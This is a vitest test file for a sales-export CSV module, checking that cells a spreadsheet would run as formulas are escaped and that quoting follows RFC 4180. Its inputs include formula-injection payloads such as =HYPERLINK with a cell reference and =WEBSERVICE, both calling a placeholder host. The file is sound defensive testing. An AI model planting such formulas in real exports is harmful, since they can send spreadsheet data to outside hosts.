import { describe, expect, it } from "vitest";
import { buildCsv, csvCell, csvLine, type ExportRow } from "@/lib/export/csv";

describe("csvCell", () => {
  it("neutralises cells a spreadsheet would run as a formula", () => {
    expect(csvCell('=HYPERLINK("https://x/?"&A2,"Espresso")')).toBe(
      `"'=HYPERLINK(""https://x/?""&A2,""Espresso"")"`,
    );
    expect(csvCell("+cmd")).toBe("'+cmd");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\t=1")).toBe("'\t=1");
    expect(csvCell("\r=1")).toBe(`"'\r=1"`);
  });

  it("leaves plain numbers, including negative ones, as numbers", () => {
    expect(csvCell("-5.00")).toBe("-5.00");
    expect(csvCell("+1")).toBe("+1");
    expect(csvCell(42)).toBe("42");
  });

  it("quotes delimiters per RFC 4180 and renders empty for null", () => {
    expect(csvCell("Latte, large")).toBe('"Latte, large"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("a\nb")).toBe('"a\nb"');
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("joins a line", () => {
    expect(csvLine(["a", null, "=1", 2])).toBe("a,,'=1,2");
  });
});

describe("buildCsv", () => {
  it("escapes an item name taken verbatim from the catalog", () => {
    const row: ExportRow = {
      saleId: "S1",
      timestampMs: "0",
      timestampIso: "1970-01-01T00:00:00.000Z",
      status: "completed",
      itemName: "=WEBSERVICE(\"https://x\")",
      quantity: "1",
      unitPrice: "3.00",
      lineTotal: "3.00",
      asset: "CASH",
      merchant: "m",
      customer: "anonymous",
      txHash: "0x1",
      blockNumber: "0",
    };
    const [, line] = buildCsv([row]).split("\n");
    expect(line).toContain(`"'=WEBSERVICE(""https://x"")"`);
  });
});
